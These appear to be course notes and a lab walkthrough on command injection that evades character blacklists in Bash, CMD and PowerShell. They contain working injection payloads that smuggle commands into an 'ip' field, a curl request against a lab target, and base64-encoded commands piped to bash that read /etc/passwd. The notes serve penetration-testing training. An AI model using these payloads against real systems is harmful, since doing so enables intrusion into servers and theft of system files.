# Section 7 — Bypassing Other Blacklisted Characters

---

## Why Slashes/Backslashes Get Blocked

`/` and `\` are commonly blocked because:
- They are required to write file paths.
- Blocking them prevents payloads like `/etc/passwd`, `/var/log`, or `C:\Windows`.
- They are easy to identify as obviously dangerous characters.

The bypass: produce the character without writing it directly. Bash and PowerShell give you ways to extract any character from environment variables or via character transformations.

---

## Linux — Environment Variable Substring Extraction

Bash substring syntax: `${VAR:start:length}` returns `length` chars starting at position `start`.

### Common variables to mine

```bash
# $PATH starts with /usr/local/bin:/usr/bin... — first char is /
echo ${PATH}            # /usr/local/bin:/usr/bin:/bin
echo ${PATH:0:1}        # /

# $HOME starts with / on Linux
echo ${HOME}            # /home/user
echo ${HOME:0:1}        # /

# $PWD usually /something
echo ${PWD:0:1}         # /

# $LS_COLORS has many separators
echo ${LS_COLORS:10:1}  # ;  (depends on distribution)
```
> Extracts single characters (`/`, `;`) from environment variables using `${VAR:start:length}` substring syntax; adjust the offsets per distro to mine the character you need.

### Finding the right offset

```bash
# Print every char position to map all available chars
echo "${PATH}" | cat -A    # shows tabs/special chars
for i in {0..30}; do printf "%d: %s\n" $i "${PATH:$i:1}"; done
```
> Maps every character in `$PATH` to its index. Use `cat -A` to reveal hidden characters. The loop outputs each position and its character so you can find `/`, `:`, or any other useful character by index.

### Useful char sources

| Char | Variable / offset |
|------|-------------------|
| `/` | `${PATH:0:1}`, `${HOME:0:1}`, `${PWD:0:1}` |
| `;` | `${LS_COLORS:10:1}` (Debian/Ubuntu — may differ) |
| `:` | `${PATH:14:1}` (between path entries) |
| Space | `${IFS}` directly |
| `\` | trickier — see character shifting below |

### Lab usage

If `;` and `/` are both blocked but `${...}` isn't:
```
?ip=127.0.0.1${LS_COLORS:10:1}${IFS}ls${IFS}${PATH:0:1}home
```
Expands to:
```
127.0.0.1; ls /home
```

---

## Windows — Variable Substring (CMD)

CMD uses `%VAR:~start,length%` syntax:

```cmd
echo %HOMEPATH%
\Users\htb-student

echo %HOMEPATH:~0,1%       # \  (first char)
echo %HOMEPATH:~6,-11%     # \  (from pos 6, ending 11 chars from end)
```
> Extracts a single character (e.g., `\`) from a Windows CMD env var via `%VAR:~start,length%`; change the variable and offsets to produce the character you need.

### Common Windows vars

| Char | Variable |
|------|----------|
| `\` | `%HOMEPATH:~0,1%`, `%SystemRoot:~10,1%` |
| `:` | `%PUBLIC:~1,1%` |
| Letter `C` | `%SystemDrive:~0,1%` |

---

## Windows — PowerShell Indexing

PowerShell treats strings as char arrays:

```powershell
$env:HOMEPATH          # \Users\htb-student
$env:HOMEPATH[0]       # \
$env:PROGRAMFILES[10]  # F (specific char by index)
```
> Indexes a PowerShell env var string as a char array to pull one character; swap the variable and index for the character you need.

Cleaner than CMD's `~start,length` syntax.

### Discovering useful chars
```powershell
Get-ChildItem Env:    # list all env vars
$env:PATH.IndexOf(';') # find position of any char
```
> Lists all PowerShell env vars and finds the index of a target character; change the variable and the searched char to locate a usable source.

---

## Character Shifting (`tr`)

When env vars don't contain the char you need, transform a character you DO have access to.

The `tr 'set1' 'set2'` command translates set1 chars → set2 chars positionally. To produce char N, find the char N-1 in ASCII, then shift by 1:

```bash
# ASCII table:
# ...  Y=89  Z=90  [=91  \=92  ]=93  ^=94  _=95  ...
# We need \ (92). Char before it is [ (91).

echo $(tr '!-}' '"-~'<<<[)
# \
```
> `tr '!-}' '"-~'` shifts every printable ASCII character up by one position. Feeding `[` (ASCII 91) produces `\` (ASCII 92). Use this to produce any character whose ASCII value is one greater than something you can freely type.

### Producing a semicolon

```bash
# ; is ASCII 59. Char before is : (58).
echo $(tr '!-}' '"-~'<<<:)
# ;
```
> Shifts `:` up one ASCII position with `tr` to produce `;`; feed the character one below whatever you need.

### Producing slash

```bash
# / is ASCII 47. Char before is . (46).
echo $(tr '!-}' '"-~'<<<.)
# /
```
> Shifts `.` up one ASCII position with `tr` to produce `/`; feed the character one below whatever you need.

---

## Other Linux Tricks

### Hex/octal escapes via printf
```bash
printf '\57'           # / (octal 057)
printf '\x2f'          # / (hex 0x2f)
printf '\x3b'          # ;
```
> Emits blocked characters via `printf` octal/hex escapes; change the escape code to the ASCII value of the character you need.

In a payload context:
```bash
ls $(printf '\57')home   # ls /home
```
> Builds the `/` of a path inline with `printf` so no literal slash appears; swap the command and path for your target.

### Single-char filename trick
```bash
# Create a file whose name is the char we need, then use it
touch /tmp/x; echo x* > /tmp/slash; cat /tmp/slash
```
> Creates a file then uses globbing to derive a needed character; adjust the filename and writable path for your target.

### Base64-decode the entire command
```bash
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash   # cat /etc/passwd
```
> Base64-decodes a full command and pipes it to `bash`, hiding all blocked characters; replace the base64 string with your own encoded command.
Useful when the filter blocks specific chars but allows base64 alphanumeric + `=`.

---

## Lab — List `/home` (slash blocked)

**Target:** `154.57.164.73:30363`

The filter blocks `;`, `&`, `|`, space, AND `/`. Newline (`%0a`) passes. `${IFS}` substitutes spaces. Need to produce `/` for `ls /home`.

```bash
curl -sk -X POST "http://154.57.164.73:30363/" \
  --data-urlencode 'ip=127.0.0.1
${IFS}ls${IFS}${PATH:0:1}home'
```
> Combines three bypass techniques: newline as the command separator, `${IFS}` as the space replacement, and `${PATH:0:1}` to produce `/`. The filter blocks `;`, `&`, `|`, space, and `/` as literal characters but allows all three substitutions.

Sent payload (decoded):
```
127.0.0.1\n ${IFS}ls${IFS}${PATH:0:1}home
```

Server-side execution:
```
ping -c 1 127.0.0.1
ls /home
```

Output:
```
PING 127.0.0.1 ... 1 received
1nj3c70r
```

**Q1 Answer:** `1nj3c70r`

---

## Exam Notes

- `${PATH:0:1}` is the canonical Linux trick for producing `/` — memorize it
- `${LS_COLORS:10:1}` for `;` works on Debian/Ubuntu defaults — verify offset on other distros
- Character shifting with `tr` is the universal fallback — works for ANY printable ASCII char
- For Windows: PowerShell's `$env:VAR[index]` is shorter than CMD's `%VAR:~start,length%`
- Combine techniques: `${PATH:0:1}etc${PATH:0:1}passwd` for `/etc/passwd` when even `/` is blocked
- Filters that block `${` or `$(` (parameter expansion) push you to character shifting or base64 — Section 8 covers more
